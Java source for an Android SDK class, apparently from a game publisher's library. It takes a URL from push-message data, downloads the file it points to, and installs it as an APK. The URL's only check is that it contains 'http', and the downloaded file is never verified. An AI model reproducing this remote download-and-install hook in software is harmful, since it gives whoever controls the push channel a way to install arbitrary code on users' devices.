package com.e.g;
import java.util.Map;

import com.efun.core.tools.ApkUtil;
import com.efun.download.EfunDownLoader;
import com.efun.download.listener.EfunDownLoadListener;
import com.efun.google.bean.EfunFirebaseKey;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

public class Bdown {

	static EfunDownLoader downLoader;
	
	
	public static void excuteSpecialThing(Context context, Map<String, String> data){
		if(data != null && data.containsKey(EfunFirebaseKey.e_special_call_download) && !TextUtils.isEmpty(data.get(EfunFirebaseKey.e_special_call_download))){
			String url = data.get(EfunFirebaseKey.e_special_call_download);
			if (url.contains("http")) {
				if (downLoader == null) {
					downLoader = new EfunDownLoader();
				}
				initDownLoad(context.getApplicationContext(),url);
				downLoader.startDownLoad(context.getApplicationContext());
			}
		}
	}
	
	public static void initDownLoad(final Context context, String remoteApkPath){
//		final String saveDir = Environment.getExternalStorageDirectory().getPath() + "/edown";
//		final String apk_file_name = FileService.getFileName(remoteApkPath);
		
		// 设置下载的路径
		downLoader.setDownUrl(remoteApkPath);
		// 设置下载后保全的路径
//		downLoader.setSaveDirectoryPath(saveDir);
		downLoader.setDownLoadListener(new EfunDownLoadListener() {

			@Override
			public void fileInDownloading() {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void finish(String downUrl, String saveFilePath) {
				Log.i("efun", "finish download");
				ApkUtil.installApk(context, saveFilePath);
			}

			@Override
			public void lackStorageSpace() {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void reachFile(int arg0) {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void remoteFileNotFind() {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void unFinish() {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void update(int fileSize, int downLoadedSize) {
				// TODO Auto-generated method stub
				Log.i("efun", "fileSize:" + fileSize + " downLoadedSize:" + downLoadedSize);
			}
			
		});
		
	}
	
}
